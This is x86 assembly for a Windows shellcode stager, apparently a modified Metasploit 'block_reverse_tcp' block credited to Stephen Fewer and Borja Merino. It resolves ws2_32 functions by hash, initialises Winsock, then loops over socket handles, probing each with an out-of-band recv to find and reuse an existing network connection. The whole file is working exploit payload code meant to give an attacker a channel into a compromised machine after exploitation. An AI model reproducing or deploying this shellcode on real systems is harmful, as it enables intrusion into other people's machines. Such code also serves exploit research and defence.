[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

; Stephen Fewer code to call WSAData
reverse_tcp:
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );

; Borja Merino modification over the "block_reverse_tcp.asm" Metasploit stager.
; In this case instead of creating a new connection the socket is located 
; (based on Out-Of-Band lifetime) and reused.

  xor edi, edi 	         ; socket handle counter
loop_handle:
  add edi, 0x04	         ; next socket
  mov edx, esp	         ; 
  push 0x1               ; MSG_OOB
  push 0x4               ; SO_CONNECT_TIME
  push edx               ; SOL_SOCKET
  push edi               ; socket handle
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, &recvbuf, 4, MSG_OOB );
  cmp eax, 0x1           ; check if the OOB-byte buffered was fetched. Otherwise, loop again
  jne loop_handle        ; 
 		         ; we found the socket (edi)
